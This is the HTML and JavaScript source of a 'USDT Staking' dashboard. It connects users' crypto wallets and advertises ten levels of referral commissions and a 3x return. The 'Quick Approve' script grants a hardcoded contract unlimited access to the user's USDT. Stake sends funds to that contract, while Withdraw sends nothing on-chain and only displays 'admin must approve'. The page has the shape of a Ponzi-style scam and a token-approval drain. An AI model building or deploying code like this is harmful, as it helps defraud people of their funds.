<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ðŸš€ USDT Staking â€” Dashboard</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
  <style>
    body { background:#111; color:#fff; font-family:sans-serif; margin:0; }
    header { display:flex; justify-content:space-between; align-items:center; padding:15px 30px; background:#000; border-bottom:2px solid #222; }
    h1 { margin:0; font-size:20px; color:#ffd700; }
    button { background:#ffd700; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; font-weight:bold; }
    button:hover { opacity:0.9; }
    .container { max-width:1000px; margin:20px auto; padding:20px; }
    .card { background:#1a1a1a; padding:20px; border-radius:12px; margin-bottom:20px; }
    h2 { margin-top:0; color:#ffd700; font-size:18px; }
    input { width:80%; padding:8px; margin-top:10px; margin-bottom:10px; border:none; border-radius:6px; }
    .btn { margin-left:5px; }
    .income-grid { display:flex; gap:10px; }
    .income-box { flex:1; background:#000; padding:15px; border-radius:10px; text-align:center; }
    table { width:100%; border-collapse:collapse; margin-top:10px; }
    table td, table th { border:1px solid #333; padding:8px; text-align:center; }
    table th { background:#222; color:#ffd700; }
  </style>
</head>
<body>

<header>
  <h1>ðŸš€ USDT Staking â€” Dashboard</h1>
  <button id="connectBtn">Connect Wallet</button>
</header>

<div class="container">

  <div class="card">
    <h2>Stake USDT</h2>
    <input id="stakeAmount" placeholder="Amount (min 20, multiples of 20)">
    <br>
    <button onclick="quickApprove()">Quick Approve</button>
    <button onclick="stake()">Stake</button>
  </div>

  <div class="card">
    <h2>Your Referral Link</h2>
    <input id="refLink" readonly>
    <button class="btn" onclick="copyRef()">Copy</button>
  </div>

  <div class="card">
    <h2>Income Wallets</h2>
    <div class="income-grid">
      <div class="income-box">
        <div>Instant Income</div>
        <b id="instantIncome">0 USDT</b>
      </div>
      <div class="income-box">
        <div>Level Income</div>
        <b id="levelIncome">0 USDT</b>
      </div>
      <div class="income-box">
        <div>ROI Income</div>
        <b id="roiIncome">0 USDT</b>
      </div>
    </div>
  </div>

  <div class="card">
    <h2>Withdraw</h2>
    <input id="withdrawAmount" placeholder="Amount (min 10, multiples of 10)">
    <br>
    <button onclick="requestWithdraw()">Request Withdraw</button>
    <div id="withdrawHistory">No withdrawals yet.</div>
  </div>

  <div class="card">
    <h2>Staking Info</h2>
    <p>Staked: <span id="staked">0 USDT</span></p>
    <p>Target (3x): <span id="target">0 USDT</span></p>
    <p>Package Status: <span id="packageStatus">Inactive</span></p>
  </div>

  <div class="card">
    <h2>Team Info</h2>
    <p><b>Direct Referrals:</b> <span id="directRef">No directs yet.</span></p>
    <p><b>Indirect Referrals:</b> <span id="indirectRef">No indirects yet.</span></p>
  </div>

  <div class="card">
    <h2>Level Structure</h2>
    <table>
      <tr><th>Level</th><th>Percent</th><th>Status</th></tr>
      <tr><td>L1</td><td>10%</td><td>Pending</td></tr>
      <tr><td>L2</td><td>10%</td><td>Pending</td></tr>
      <tr><td>L3</td><td>5%</td><td>Pending</td></tr>
      <tr><td>L4</td><td>3%</td><td>Pending</td></tr>
      <tr><td>L5</td><td>2%</td><td>Pending</td></tr>
      <tr><td>L6</td><td>1%</td><td>Pending</td></tr>
      <tr><td>L7</td><td>1%</td><td>Pending</td></tr>
      <tr><td>L8</td><td>1%</td><td>Pending</td></tr>
      <tr><td>L9</td><td>1%</td><td>Pending</td></tr>
      <tr><td>L10</td><td>1%</td><td>Pending</td></tr>
    </table>
  </div>

</div>

<script>
let provider, signer, account;
const stakingAddress = "0x3aF2c75A4723b2139EB803bf5d558e7d43991D6E";
const tokenAddress   = "0xEbA5032Be8fc2d2a2fa29e134853ab6aAA12fa1C";
const stakingAbi = [ /* paste full ABI here */ ];
const tokenAbi   = [ /* paste USDT ABI here */ ];
let staking, token;

document.getElementById("connectBtn").onclick = async function() {
  if(window.ethereum){
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    account = await signer.getAddress();
    document.getElementById("connectBtn").innerText = account.slice(0,6)+"..."+account.slice(-4);
    staking = new ethers.Contract(stakingAddress, stakingAbi, signer);
    token = new ethers.Contract(tokenAddress, tokenAbi, signer);
    // referral link
    document.getElementById("refLink").value = window.location.origin + "?ref=" + account;
  } else {
    alert("Install MetaMask!");
  }
};

function copyRef(){
  const ref = document.getElementById("refLink");
  ref.select(); ref.setSelectionRange(0,99999);
  document.execCommand("copy");
  alert("Referral link copied!");
}

async function quickApprove(){
  const amt = ethers.constants.MaxUint256;
  await token.approve(stakingAddress, amt);
  alert("Approved!");
}

async function stake(){
  const val = parseFloat(document.getElementById("stakeAmount").value);
  if(val < 20 || val%20 !== 0) { alert("Min 20 USDT in multiples of 20"); return; }
  const amt = ethers.utils.parseUnits(val.toString(), 6);
  await staking.deposit(amt, ethers.constants.AddressZero); 
  alert("Staked!");
}

async function requestWithdraw(){
  const val = parseFloat(document.getElementById("withdrawAmount").value);
  if(val < 10 || val%10 !== 0) { alert("Min 10 USDT in multiples of 10"); return; }
  alert("Withdraw request sent (admin must approve).");
}
</script>

</body>
</html>
